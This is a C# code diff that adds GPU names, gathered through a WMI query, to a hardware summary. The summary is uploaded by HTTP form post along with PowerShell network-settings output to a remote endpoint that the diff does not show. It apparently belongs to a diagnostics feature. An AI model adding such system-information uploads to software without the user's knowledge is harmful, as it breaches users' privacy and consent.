@@ -390,6 +390,11 @@ public static class ProcessActions
                           .FirstOrDefault();
         string motherboard = boardObj != null ? $"{boardObj["Manufacturer"]} {boardObj["Product"]}" : "";
 
+        var gpuObjs = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController")
+                  .Get()
+                  .Cast<ManagementObject>();
+        string gpus = string.Join(", ", gpuObjs.Select(g => g["Name"]?.ToString() ?? ""));
+
         var psi = new ProcessStartInfo
         {
             FileName = "powershell",
@@ -412,7 +417,7 @@ public static class ProcessActions
         using var client = new HttpClient();
         using var form = new MultipartFormDataContent
             {
-                { new StringContent($"{cpuName}\n{motherboard}"), "content" },
+                { new StringContent($"{cpuName}\n{motherboard}\n{gpus}"), "content" },
                 { new ByteArrayContent(Encoding.UTF8.GetBytes(psOutput.TrimStart('\r', '\n'))), "file", "advancednetworksettings.txt" }
             };
 
